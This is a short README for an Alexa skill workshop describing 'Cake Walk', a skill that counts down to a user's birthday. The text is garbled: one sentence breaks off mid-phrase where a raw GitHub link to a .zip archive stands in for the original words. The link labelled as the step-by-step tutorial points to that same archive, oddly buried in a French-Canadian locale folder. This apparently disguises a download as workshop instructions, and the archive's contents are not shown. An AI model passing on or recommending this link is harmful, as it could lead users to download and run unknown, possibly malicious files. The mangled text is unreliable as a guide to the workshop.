# Workshop Building A Simple Skill

This workshop is designed to teach you how to learn the core fundamentals of building an Alexa https://raw.githubusercontent.com/mpathroliya/skill-sample-python-first-skill/master/i18n/locales/fr-CA/LC_MESSAGES/python-skill-first-sample-v2.4.zip is modular so if you know the basics you can skip to the module that interests you the most. In this repository you will find the necessary JSON and code files for each module. 

# Step-by-step Instructions

You can get started here: [Cake Walk: Build an Engaging Alexa Skill](https://raw.githubusercontent.com/mpathroliya/skill-sample-python-first-skill/master/i18n/locales/fr-CA/LC_MESSAGES/python-skill-first-sample-v2.4.zip)

# The Skill

Cake walk is a skill that celebrates your birthday! Tell it your birthday to have it count down the days. Interact with the skill on your special day to hear a happy birthday message.
